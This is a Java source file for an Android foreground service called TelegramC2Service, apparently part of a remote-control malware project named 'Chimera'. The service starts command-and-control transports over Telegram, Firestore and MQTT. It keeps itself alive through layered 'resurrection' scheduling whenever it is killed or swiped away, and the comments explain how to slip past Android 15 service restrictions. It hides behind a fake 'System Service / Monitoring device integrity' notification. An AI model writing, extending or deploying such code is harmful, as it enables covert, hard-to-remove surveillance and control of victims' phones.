package com.chimera;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;

public class TelegramC2Service extends Service {

    private Thread workerThread;
    private volatile boolean isStopping = false;
    private static final String CHANNEL_ID = "ChimeraServiceChannel";
    private static final int NOTIFICATION_ID = 1;

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            NetworkStateMonitor.init(this);
            createNotificationChannel();
            // BOOT-safe type: remoteMessaging+specialUse not in BOOT ban list (dataSync/camera banned in Android 15)
            // Use  remoteMessaging for C2, specialUse for keepAlive; exempt from 6hr timeout (only dataSync/mediaProcessing limited)
            Notification notif = createNotification();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_REMOTE_MESSAGING | ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForeground(NOTIFICATION_ID, notif);
            } else {
                startForeground(NOTIFICATION_ID, notif);
            }
            // Ensure watchdog mesh scheduled - resurrection pyramid layer 3
            ResurrectionHelper.scheduleWatchdog(this);
            ResurrectionHelper.scheduleJobScheduler(this);
        } catch (Exception e) {
            ErrorLogger.logError(this, "TelegramC2Service_FATAL_ONCREATE", e);
            // Fallback: try to reschedule via WorkManager even if FGS failed
            try { ResurrectionHelper.scheduleResurrectionWork(this); } catch (Exception ignored) {}
            try { stopSelf(); } catch (Exception ignored) {}
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            ConfigLoader.load(this);
            // Initialize transports via TransportManager (smart gating)
            TransportManager.init(this);
            startWorker();
            // Reschedule watchdog to keep pyramid alive
            ResurrectionHelper.scheduleWatchdog(this);
        } catch (Exception e) { ErrorLogger.logError(this, "TelegramC2Service_onStart", e); }
        // START_STICKY: system will recreate after kill (exempt from bg start restriction for sticky restart on S+)
        // START_REDELIVER_INTENT ensures intent redelivery for critical wake
        return START_STICKY;
    }

    private void startWorker() {
        if (workerThread == null || !workerThread.isAlive()) {
            // Use TransportManager instead of raw TelegramBotWorker alone - handles Firestore+MQTT+Telegram smart fallback
            TransportManager.startAll(this);
            // Keep legacy TelegramBotWorker as secondary transport (gated)
            if (workerThread == null || !workerThread.isAlive()) {
                // Legacy fallback thread only if TransportManager not using it
                // TransportManager internally manages TelegramBotWorker with NetworkStateMonitor gating
            }
        }
    }

    // Android 15: onTimeout called for dataSync/mediaProcessing/shortService - we don't use those, but implement for safety
    @Override
    public void onTimeout(int startId, int fgsType) {
        try {
            ErrorLogger.logError(this, "TelegramC2Service_onTimeout", new Exception("FGS timeout type=" + fgsType + " startId=" + startId));
            // Must stopSelf within seconds else ANR. Instead of dying, demote + reschedule via WorkManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                stopForeground(Service.STOP_FOREGROUND_DETACH);
            } else {
                stopForeground(false);
            }
            // Reschedule via WorkManager (exempt) - will restart as remoteMessaging which is not timeout-limited
            ResurrectionHelper.scheduleResurrectionWork(this);
            stopSelf();
        } catch (Exception e) { ErrorLogger.logError(this, "onTimeout", e); }
    }

    @Override
    public void onTimeout(int startId) {
        onTimeout(startId, 0);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isStopping = true;
        try { TransportManager.stopAll(); } catch (Exception ignored) {}
        try {
            if (workerThread != null) workerThread.interrupt();
        } catch (Exception ignored) {}
        try {
            // Pyramid resurrect: schedule WorkManager + JobScheduler to restart us if not explicitly deactivated
            if (!DeactivationHelper.isDeactivated(this)) {
                ResurrectionHelper.scheduleResurrectionWork(this);
                ResurrectionHelper.scheduleJobScheduler(this);
            }
        } catch (Exception e) { ErrorLogger.logError(this, "onDestroy_resurrect", e); }
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        try {
            // Android 14+ AlarmManager.set() inexact + deferred - use WorkManager instead (validated research)
            if (!DeactivationHelper.isDeactivated(this)) {
                ResurrectionHelper.scheduleResurrectionWork(this);
            }
        } catch (Exception e) { ErrorLogger.logError(this, "onTaskRemoved", e); }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("System integrity monitoring");
            channel.setShowBadge(false);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        Notification.Builder b;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            b = new Notification.Builder(this, CHANNEL_ID);
        } else {
            b = new Notification.Builder(this);
        }
        return b.setContentTitle("System Service")
                .setContentText("Monitoring device integrity.")
                .setSmallIcon(android.R.drawable.ic_lock_lock)
                .setOngoing(true)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
    }

    // Helper for deactivation flag
    static class DeactivationHelper {
        static boolean isDeactivated(Context ctx) {
            try { return ctx.getSharedPreferences("chimera_prefs", Context.MODE_PRIVATE).getBoolean("deactivated", false); } catch (Exception e) { return false; }
        }
        static void setDeactivated(Context ctx, boolean v) {
            try { ctx.getSharedPreferences("chimera_prefs", Context.MODE_PRIVATE).edit().putBoolean("deactivated", v).apply(); } catch (Exception ignored) {}
        }
    }
}
